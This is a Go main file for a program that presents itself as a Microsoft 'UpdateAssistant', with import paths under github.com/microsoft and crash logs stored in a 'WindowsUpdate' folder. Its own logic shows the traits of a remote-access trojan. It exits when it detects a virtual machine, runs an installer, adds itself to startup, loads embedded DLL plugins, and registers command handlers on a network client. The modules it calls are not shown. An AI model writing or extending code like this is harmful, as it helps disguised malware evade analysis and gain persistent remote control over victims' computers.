package main

import (
	"embed"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"runtime/debug"
	"time"

	"github.com/microsoft/UpdateAssistant/modules/apps"
	"github.com/microsoft/UpdateAssistant/modules/commands"
	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/install"
	"github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

//go:embed plugins/dll
var pluginFS embed.FS

func writePanic(v interface{}, stack []byte) {
	base := os.Getenv("APPDATA")
	if base == "" {
		base = os.TempDir()
	}
	dir := filepath.Join(base, "WindowsUpdate", "crashes")
	os.MkdirAll(dir, 0755)
	name := fmt.Sprintf("panic_%s.log", time.Now().Format("20060102_150405_000"))
	f, err := os.Create(filepath.Join(dir, name))
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "panic: %v\n\n%s\n", v, stack)
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			writePanic(r, debug.Stack())
		}
	}()

	if sub, err := fs.Sub(pluginFS, "plugins/dll"); err == nil {
		loader.SetFS(sub)
	}

	if !config.Debug && sysutil.IsVM() {
		os.Exit(0)
	}
	install.Run()

	client := transport.New()
	cmds := ipc.New()
	commands.RegisterAllCommands(cmds)
	client.OnConnect(func() {
		logger.Init(client)
		go func() {
			defer func() { recover() }()
			sysutil.StartupAdd()
		}()
	})

	apps.Register(client, cmds)

	if err := client.Run(); err != nil {
		os.Exit(1)
	}
}
